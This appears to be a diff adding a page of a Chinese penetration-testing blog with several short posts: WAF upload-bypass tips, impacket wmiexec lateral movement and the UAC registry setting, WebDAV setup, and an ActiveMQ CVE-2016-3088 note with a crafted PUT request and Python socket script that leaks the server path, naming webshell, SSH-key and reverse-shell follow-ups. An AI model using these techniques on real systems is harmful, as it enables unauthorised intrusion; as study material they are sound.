+<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>遇到正常重放上传图片都不可以；有些WAF将Connection: close做为特征进行拦截，例如Burp Suite发包重放的时候，默认为:Connection: close（在Burp Suite中可以修改配置），导致WAF进行拦截，正常浏览器是Connection:keep-alive，故删除或者修改为keep-alive即可。</p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>畸形包，例如删除content-type等</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/05/impacket远程命令执行记录/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="YoungRichOG">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="YoungRichOG">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/03/05/impacket远程命令执行记录/" itemprop="url">impacket远程命令执行记录</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-05T21:07:27+08:00">
+                2020-03-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="impacket远程命令执行记录"><a href="#impacket远程命令执行记录" class="headerlink" title="impacket远程命令执行记录"></a>impacket远程命令执行记录</h1><p><strong><del>转载请注明出处：<a href="https://youngrichog.github.io/" target="_blank" rel="noopener">https://youngrichog.github.io/</a></del><em>**</em></strong></p>
+<p>在横向移动的时候常常会遇到目标445端口被防火墙过滤的情况，那么我们就需要通过其他端口进行横向移动。</p>
+<p>之前对impacket中远程命令执行的帮助文件看的不是很透彻，导致掉坑里。</p>
+<h2 id="wmiexec-amp-dcomexec"><a href="#wmiexec-amp-dcomexec" class="headerlink" title="wmiexec&amp;dcomexec"></a>wmiexec&amp;dcomexec</h2><p>正常我们使用wmiexec、dcomexec的时候，命令会这样写，会回显执行结果。这时wmiexec、dcomexec会使用135、445端口，但如果目标445端口被防火墙过滤就会导致远程命令执行失败。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py administrator@172.16.102.135 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+<p>后续发现有一个参数叫-nooutput就可以解决这样的情况，这时wmiexec、dcomexec仅仅会使用135端口，但是不会有回显。有些时候很有必要把debug打开。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Impacket v0.9.14-dev - Copyright 2002-2015 Core Security Technologies</span><br><span class="line"></span><br><span class="line">usage: wmiexec.py [-h] [-share SHARE] [-nooutput] [-debug]</span><br><span class="line">                  [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]</span><br><span class="line">                  target [command [command ...]]</span><br><span class="line"></span><br><span class="line">Executes a semi-interactive shell using Windows Management Instrumentation.</span><br><span class="line"></span><br><span class="line">positional arguments:</span><br><span class="line">  target                [[domain/]username[:password]@]&lt;targetName or address&gt;</span><br><span class="line">  command               command to execute at the target. If empty it will</span><br><span class="line">                        launch a semi-interactive shell</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -share SHARE          share where the output will be grabbed from (default</span><br><span class="line">                        ADMIN$)</span><br><span class="line">  -nooutput             whether or not to print the output (no SMB connection</span><br><span class="line">                        created)</span><br><span class="line">  -debug                Turn DEBUG output ON</span><br><span class="line"></span><br><span class="line">authentication:</span><br><span class="line">  -hashes LMHASH:NTHASH</span><br><span class="line">                        NTLM hashes, format is LMHASH:NTHASH</span><br><span class="line">  -no-pass              don&apos;t ask for password (useful for -k)</span><br><span class="line">  -k                    Use Kerberos authentication. Grabs credentials from</span><br><span class="line">                        ccache file (KRB5CCNAME) based on target parameters.</span><br><span class="line">                        If valid credentials cannot be found, it will use the</span><br><span class="line">                        ones specified in the command line</span><br><span class="line">  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256</span><br><span class="line">                        bits)</span><br></pre></td></tr></table></figure>
+<p>感觉这张图总结的很好，喜欢了😍</p>
+<p><img src="/2020/03/05/impacket远程命令执行记录/1.png" alt="img"></p>
+<h2 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h2><p>在横向移动的时候我们也常常会遇到UAC的问题，rpc_s_access_denied是我们不愿意看到的。</p>
+<p>主要分为两种情况：工作组、域</p>
+<p>工作组：</p>
+<blockquote>
+<p>对于任何非RID 500的本地管理员（Administrator）连接到WIndows Vista+的计算机，无论是采用WMI、PSexec还是其他方法，使用的令牌都是”已经过滤过的”（即中等令牌）。当使用上述命令进行链接的时候会显示Access is Denied。</p>
+</blockquote>
+<p><img src="/2020/03/05/impacket远程命令执行记录/2.png" alt="img"></p>
+<p>在工作组的情况，我们需要使用RID 500的Administrator才可以成功。如果想要在非RID 500的账户测试，需要更改一下注册表。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy</span><br></pre></td></tr></table></figure>
+<p>域：</p>
+<p>我记得在域的环境下，貌似远程UAC是不一样的，具体的忘记了，后续补一下。</p>
+<h2 id="Respect"><a href="#Respect" class="headerlink" title="Respect"></a>Respect</h2><p><a href="https://dolosgroup.io/blog/remote-access-cheat-sheet" target="_blank" rel="noopener">https://dolosgroup.io/blog/remote-access-cheat-sheet</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/08/Active-Directory域-ACL相关安全研究/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="YoungRichOG">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="YoungRichOG">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/02/08/Active-Directory域-ACL相关安全研究/" itemprop="url">Active Directory域-ACL相关安全研究</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-08T12:15:36+08:00">
+                2020-02-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h1 id="Active-Directory域-ACL相关安全研究"><a href="#Active-Directory域-ACL相关安全研究" class="headerlink" title="Active Directory域-ACL相关安全研究"></a>Active Directory域-ACL相关安全研究</h1><p><strong><del>转载请注明出处：<a href="https://youngrichog.github.io/" target="_blank" rel="noopener">https://youngrichog.github.io/</a></del></strong></p>
+<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>从攻击者的角度进行ACL相关安全研究，主要从ACL基础、ACL解析、ACL枚举、ACL利用、ACL自动化攻击、ACL防御几个角度，可能会有不准确和不正确的地方。</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2020/02/08/Active-Directory域-ACL相关安全研究/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/22/webdav搭建小记/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="YoungRichOG">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="YoungRichOG">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/12/22/webdav搭建小记/" itemprop="url">webdav搭建小记</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-22T12:37:46+08:00">
+                2019-12-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="webdav搭建小记"><a href="#webdav搭建小记" class="headerlink" title="webdav搭建小记"></a>webdav搭建小记</h1><p><strong><del>转载请注明出处：<a href="https://youngrichog.github.io/" target="_blank" rel="noopener">https://youngrichog.github.io/</a></del></strong></p>
+<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>该文章主要还是记录搭建完webdav所遇到的一些问题</p>
+<h2 id="搭建支持基础认证的webdav"><a href="#搭建支持基础认证的webdav" class="headerlink" title="搭建支持基础认证的webdav"></a>搭建支持基础认证的webdav</h2><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><p>搭建完非SSL带基础认证的webdav，我们进行连接的时候会发现怎么都连接不上，说是网络错误等问题。</p>
+<p>查阅相关文档，发现注册表的BasicAuthLevel的值默认为1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WebClient\Parameters</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/12/22/webdav搭建小记/1.png" alt="img"></p>
+<p>如果想要使用非SSL+基础认证就需要修改BasicAuthLevel的值为2，这样就支持HTTP和HTTPS了</p>
+<p>修改完注册表，重启WebClient，然后就可以连接成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net stop WebClient</span><br><span class="line">net start WebClient</span><br><span class="line">net use x: http://ip/webdav &quot;password&quot; /user:username</span><br></pre></td></tr></table></figure>
+<h3 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h3><p>搭建SSL带基础认证的webdav，我们需要配置证书，需要给机器导入crt，这一步需要system权限</p>
+<p>没有导入crt证书的情况</p>
+<p><img src="/2019/12/22/webdav搭建小记/2.png" alt="img"></p>
+<p>导入证书(根信任)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use x: https://xxx/webdav &quot;password&quot; /user:username</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/12/22/webdav搭建小记/3.png" alt="img"></p>
+<h2 id="搭建不支持基础认证的webdav"><a href="#搭建不支持基础认证的webdav" class="headerlink" title="搭建不支持基础认证的webdav"></a>搭建不支持基础认证的webdav</h2><p>那么就可以直接连接非SSL的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use x: http://xxx/webdav &quot;password&quot; /user:username</span><br></pre></td></tr></table></figure>
+<p><strong>注意设置好权限，可读不可写，要不然容易出安全问题*</strong></p>
+<h2 id="Respect"><a href="#Respect" class="headerlink" title="Respect"></a>Respect</h2><p><a href="https://docs.microsoft.com/zh-cn/office/troubleshoot/powerpoint/office-opens-blank-from-sharepoint" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/office/troubleshoot/powerpoint/office-opens-blank-from-sharepoint</a></p>
+<p><a href="https://forums.iis.net/t/1176106.aspx?WebDAV+over+SSL" target="_blank" rel="noopener">https://forums.iis.net/t/1176106.aspx?WebDAV+over+SSL</a></p>
+<p><a href="https://untitled.pw/repairing/536.html" target="_blank" rel="noopener">https://untitled.pw/repairing/536.html</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/10/ActiveMQ-CVE-2016-3088-远程代码执行记录/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="YoungRichOG">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="YoungRichOG">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/10/10/ActiveMQ-CVE-2016-3088-远程代码执行记录/" itemprop="url">ActiveMQ(CVE-2016-3088)远程代码执行记录</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-10T22:53:39+08:00">
+                2019-10-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="ActiveMQ-CVE-2016-3088-远程代码执行记录"><a href="#ActiveMQ-CVE-2016-3088-远程代码执行记录" class="headerlink" title="ActiveMQ(CVE-2016-3088)远程代码执行记录"></a>ActiveMQ(CVE-2016-3088)远程代码执行记录</h1><p><strong><del>转载请注明出处：<a href="https://youngrichog.github.io/" target="_blank" rel="noopener">https://youngrichog.github.io/</a></del></strong></p>
+<p>两种情况：</p>
+<ol>
+<li>有账号密码</li>
+<li>无账号密码</li>
+</ol>
+<h2 id="有账号密码"><a href="#有账号密码" class="headerlink" title="有账号密码"></a>有账号密码</h2><ul>
+<li><p>webshell</p>
+</li>
+<li><p>ssh public</p>
+</li>
+<li><p>crontab</p>
+</li>
+<li><p>配合CVE-2015-5254</p>
+<p>·······</p>
+</li>
+</ul>
+<p>有账号密码的情况下可以拿到绝对路径，访问/admin/test/systemProperties.jsp</p>
+<p><img src="/2019/10/10/ActiveMQ-CVE-2016-3088-远程代码执行记录/1.png" alt="img"></p>
+<p>然后直接PUT，由于fileserver目录不能解析需要MOVE到admin目录，只有登录才能访问</p>
+<p>在Apache ActiveMQ 5.7及以下版本，可以通过下面爆绝对路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PUT /fileserver/%20/%20 HTTP/1.1</span><br><span class="line">Host: ip:port</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/10/ActiveMQ-CVE-2016-3088-远程代码执行记录/2.png" alt="img"></p>
+<p>另外记录一个点，就是写代码的时候遇到的。</p>
+<p>请求包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PUT /fileserver/%20/%20 HTTP/1.1</span><br><span class="line">Host: ip:port</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
+<p>返回包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 500 /asd/application_install/apache-activemq-5.9.1/webapps/fileserver/ /  (Not a directory)</span><br><span class="line">Connection: close</span><br><span class="line">Server: Jetty(7.6.9.v20130131)</span><br></pre></td></tr></table></figure>
+<p>我想要获取/asd/application_install/apache-activemq-5.9.1/webapps/fileserver/这一部分，用requests不知道用什么获取，后续在看看，然后暂时用socket去获取</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/env python3</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">sock = socket.socket() </span><br><span class="line">sock.connect((&apos;ip&apos;, 8161)) #修改ip和port</span><br><span class="line">request = &apos;PUT /fileserver/%20/%20 HTTP/1.0\r\nHost: 149.129.130.83:8161\r\n\r\n&apos;</span><br><span class="line">sock.send(request.encode(&apos;utf-8&apos;))</span><br><span class="line">res = sock.recv(4096)</span><br><span class="line">sock.close()</span><br><span class="line">print(res.decode(&apos;utf-8&apos;))</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/10/ActiveMQ-CVE-2016-3088-远程代码执行记录/3.png" alt="img"></p>
+<h2 id="无账号密码情况"><a href="#无账号密码情况" class="headerlink" title="无账号密码情况"></a>无账号密码情况</h2><ul>
+<li>ssh public</li>
+<li>crontab</li>
+</ul>
+<p>无账号密码，就只能写个ssh公钥或者计划个反弹shell</p>
+<p>简单记录下 ：-)</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/26/git删除远程commit/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="YoungRichOG">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="YoungRichOG">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/09/26/git删除远程commit/" itemprop="url">git删除远程commit</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-26T01:24:17+08:00">
+                2019-09-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="git删除远程commit"><a href="#git删除远程commit" class="headerlink" title="git删除远程commit"></a>git删除远程commit</h1><p><strong><del>转载请注明出处：<a href="https://youngrichog.github.io/" target="_blank" rel="noopener">https://youngrichog.github.io/</a></del></strong></p>
+<p>简单记录一下，如果说在提交git的时候，把敏感信息提交上去了，就会用到，故做记录</p>
+<p>用git bash进到blog目录，进到.git目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard HEAD~2 //强制回退2个版本</span><br><span class="line">git push -f //强制覆盖</span><br></pre></td></tr></table></figure>
+<h2 id="Respect"><a href="#Respect" class="headerlink" title="Respect"></a>Respect</h2><p><a href="https://blog.csdn.net/caobin_study/article/details/87372439" target="_blank" rel="noopener">https://blog.csdn.net/caobin_study/article/details/87372439</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+  </section>
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right"></i></a>
+  </nav>
+
+
+
+          </div>
+          
+
+
+          
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">YoungRichOG</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">YoungRichOG</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_pv"><br>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
